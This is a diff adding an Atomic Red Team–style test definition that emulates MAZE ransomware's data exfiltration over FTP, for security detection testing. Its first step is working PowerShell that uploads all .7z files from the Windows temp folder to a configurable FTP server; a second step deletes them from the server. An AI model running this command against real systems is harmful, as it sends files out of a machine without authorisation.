@@ -1,0 +1,64 @@
+{
+  "id": "57799bc2-ad1e-4130-a793-fb0c385130ba",
+  "name": "MAZE FTP Upload",
+  "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "bba01728-0e07-4d2e-9fa2-ee9f45c39b97",
+      "type": "execute-command",
+      "data": {
+        "command": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f6b00b38-c85d-4007-9509-01fd9a9d1149",
+      "type": "execute-command",
+      "data": {
+        "command": "$ftp = \"ftp://#{ftp_server}/\"\ntry {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\"))\n{$uri = New-Object System.Uri($ftp+$file.name)\n $ftp_del = [System.Net.FtpWebRequest]::create($uri)\n $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')\n $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile\n $ftp_del.GetResponse()}} catch{}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "bba01728-0e07-4d2e-9fa2-ee9f45c39b97",
+      "p": "on-success",
+      "o": "f6b00b38-c85d-4007-9509-01fd9a9d1149"
+    },
+    {
+      "s": "bba01728-0e07-4d2e-9fa2-ee9f45c39b97",
+      "p": "on-failure",
+      "o": "f6b00b38-c85d-4007-9509-01fd9a9d1149"
+    }
+  ],
+  "tags": [
+    "T1048.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "ftp_server",
+      "type": "string",
+      "description": "FTP Server address",
+      "value": "127.0.0.1"
+    },
+    {
+      "name": "username",
+      "type": "string",
+      "description": "Username for FTP server login",
+      "value": ""
+    },
+    {
+      "name": "password",
+      "type": "string",
+      "description": "Password for FTP server login",
+      "value": ""
+    }
+  ]
+}
